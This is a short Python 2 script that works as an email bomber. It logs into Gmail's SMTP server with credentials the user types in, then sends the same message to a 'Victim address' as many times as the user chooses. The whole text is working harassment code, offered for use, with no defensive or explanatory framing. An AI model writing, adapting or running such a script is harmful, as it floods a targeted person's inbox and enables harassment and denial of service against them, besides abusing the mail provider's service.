import smtplib

fromaddress = raw_input("Your address:")
toaddress = raw_input("Victim address:")

username = raw_input("Your username:")
password = raw_input("Your password:")

message = raw_input("Enter message:")

number = input("Enter the number of messages:")

server = smtplib.SMTP('smtp.gmail.com:587')
server.starttls()
server.login(username,password)

for i in range(number) :
    server.sendmail(fromaddress,toaddress,message)
print "mail sent"

server.quit()